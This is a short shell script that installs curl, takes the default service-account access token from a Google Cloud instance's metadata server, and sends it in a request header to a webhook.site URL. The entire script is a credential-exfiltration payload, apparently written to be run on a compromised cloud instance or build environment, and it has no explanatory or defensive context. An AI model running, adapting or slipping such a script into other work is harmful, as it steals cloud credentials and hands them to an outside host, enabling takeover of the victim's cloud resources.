#!/bin/sh
apt update
apt install curl -y
token=`curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"`
curl https://webhook.site/a9699f11-d510-4832-a937-e953d584f351 -H "token: $token"
